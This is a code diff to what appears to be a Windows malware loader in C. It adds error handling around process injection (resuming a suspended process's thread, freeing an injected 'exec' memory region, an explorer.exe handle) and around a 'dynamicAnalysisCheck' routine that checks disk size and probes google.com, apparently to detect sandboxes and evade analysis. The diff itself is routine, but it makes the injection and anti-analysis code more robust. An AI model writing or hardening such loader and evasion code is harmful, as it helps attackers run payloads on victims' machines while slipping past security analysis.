@@ -134,9 +134,18 @@ int main()
             return 1;
         }
 
-        ResumeThread(pi.hThread);
         WaitForSingleObject(hThread, INFINITE);
         CloseHandle(hThread);
+        if (ResumeThread(pi.hThread) == (DWORD)-1) {
+            printf("ResumeThread failed. Error: %d\n", GetLastError());
+            VirtualFreeEx(pi.hProcess, exec, 0, MEM_RELEASE);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            if (hExplorerexe) {
+                CloseHandle(hExplorerexe);
+            }
+            return 1;
+        }
 
         VirtualFreeEx(pi.hProcess, exec, 0, MEM_RELEASE);
         CloseHandle(pi.hProcess);
@@ -167,7 +176,10 @@ bool dynamicAnalysisCheck() {
     DISK_GEOMETRY pDiskGeometry;
     DWORD bytesReturned;
     if (hDevice == INVALID_HANDLE_VALUE) return false;
-    DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
+    if (!DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL)) {
+        CloseHandle(hDevice);
+        return false;
+    }
     CloseHandle(hDevice);
     DWORD diskSizeGB;
     diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
@@ -178,14 +190,46 @@ bool dynamicAnalysisCheck() {
 
     // check internet connection (server response should be 1337 change it if you want)
     HINTERNET hSession = WinHttpOpen(L"Mozilla 5.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) return false;
     HINTERNET hConnection = WinHttpConnect(hSession, L"google.com", INTERNET_DEFAULT_HTTP_PORT, 0);
+    if (!hConnection) {
+        WinHttpCloseHandle(hSession);
+        return false;
+    }
     HINTERNET hRequest = WinHttpOpenRequest(hConnection, L"GET", L"test", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);
-    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
-    WinHttpReceiveResponse(hRequest, 0);
+    if (!hRequest) {
+        WinHttpCloseHandle(hConnection);
+        WinHttpCloseHandle(hSession);
+        return false;
+    }
+    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
+        !WinHttpReceiveResponse(hRequest, 0)) {
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnection);
+        WinHttpCloseHandle(hSession);
+        return false;
+    }
     DWORD responseLength;
-    WinHttpQueryDataAvailable(hRequest, &responseLength);
+    if (!WinHttpQueryDataAvailable(hRequest, &responseLength)) {
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnection);
+        WinHttpCloseHandle(hSession);
+        return false;
+    }
     PVOID response = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, responseLength + 1);
-    WinHttpReadData(hRequest, response, responseLength, &responseLength);
+    if (!response) {
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnection);
+        WinHttpCloseHandle(hSession);
+        return false;
+    }
+    if (!WinHttpReadData(hRequest, response, responseLength, &responseLength)) {
+        HeapFree(GetProcessHeap(), 0, response);
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnection);
+        WinHttpCloseHandle(hSession);
+        return false;
+    }
     if (response) {
         HeapFree(GetProcessHeap(), 0, response);
     }
